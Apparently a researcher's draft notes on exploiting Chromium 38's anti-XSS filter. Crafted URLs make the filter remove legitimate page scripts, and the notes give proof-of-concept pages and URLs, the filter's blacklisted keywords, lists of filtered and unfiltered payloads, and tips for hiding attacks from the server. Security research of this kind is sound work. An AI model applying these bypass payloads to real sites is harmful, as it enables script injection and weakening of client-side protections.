Exploiting the browser anti-XSS filter for fun and profit.
==========================================================
(First draft, with Chromium 38.0.2125.111)

Teaser :
--------

        <script>
            var e=eval;
            var eval=function(s){
                e(s.match(/\d+/g))
            }
        </script>

        <button onclick="eval(document.location.hash.substr(1))">
            Is it vulnerable ?
        </button>

Well, it sure shouldn't be vulnerable, right ? And still, it is !

Abstract
--------

!!! (Chromium 38.0.2125.111)

Proofs of concept
-----------------
    Story 1 : 
        "You can safely export your password, it will be encrypted anyway (using the awesome base64)"
            <script>var a = 'secret' ;</script>
            <script>a=btoa(a);</script>
            <script>alert(a);</script>

        "... Except with this URL"
            http://localhost/xss/cleartext.html#<script>a=btoa(a);

    Story 2 :
        "You won't lose your work, it is saved automagically when you close the project"
            <a onclick="alert('saved !')" href="out">
                close this project
            </a>
        "Except with this URL"
            http://localhost/xss/tags.html#onclick="alert('saved !')"


    From story 2, I guess there is a lot of fun stuff to do with angularJS apps ?
        well, nope. ng-X doesn't trigger..


    Story 3 :
        <script>
            var e=eval;
            var eval=function(s){
                e(s.match(/\d+/g))
            }
        </script>

        <button onclick="eval(document.location.hash.substr(1))">
            Is it vulnerable ?
        </button>

        http://localhost/xss/dom.html?%3Cscript%3E%0A%20%20%20%20var%20e%3Deval%3B%0A%20%20%20%20var%20eval%3Dfunction%28s%29%7B%0A%20%20%20%20%20%20%20%20e%28s.match%28/%5Cd%2B/g%29%29%0A%20%20%20%20%7D%0A#alert(1)

The filter
----------

Rules ?

    just being in the url is fine. No "real purpose" required
    starting or ending with <script

    all occurences removed

    between 2 <script , or inside a < > if there is a blacklisted keyword

    blank spaces sensitive

blacklist :

        onload
        onerror
        onmouseove
        onclick
        href="javascript:


Thoughts & tips
---------------

    differentiate 2 "black holes" using &
    Want to hide your attack from the server ? use # instead of ?

    Best case exploitation : we can remove any part of the legitimate script.
        it is not as good as execution, but still not bad !
        we're not there yet. not even close..

    Doesn't require any coding error from the dev. 
    Really, all it requires is about coding syntax, flow patterns etc... Tell me about weird !

    Main applications (speculation):

        disable sanitisation of inputs
            DOM-based XSS only, probably
        weaken client-side cryptography
            remove the seed init ? remove the encryption part ?
        unexpected app behavior



Data
----
Filtered :

    http://localhost/xss/manip.php#p=<script>alert(1)</script>
    http://localhost/xss/manip.php#p=<script>alert(1)
    http://localhost/xss/manip.php#<script>alert(1)
    echo.php?p=<img onerror="test"/>
    echo.php?p=<img onerr="test"/>
    echo.php?p=<img on="javascript:test"/>

Not filtered :
    
    http://localhost/xss/manip.php?p=alert(1)
    manip.php?p=<script src="s.js"></script>
    echo.php?p=<img/>
    echo.php?p=<img a="test"/>
    echo.php?p=<img on="test"/>
    http://localhost/xss/cleartext.php#%3Cscript%3Ea=btoa(a);%0Aalert(a);%0A%3C/script%3E
    http://localhost/xss/cleartext.php#%0Aa=btoa(a);%0A%3C/script%3E

bug ?

    http://localhost/xss/incl.html#<script src="s.js"></script>
        console says it is blocked, but really it runs.. ??

papers :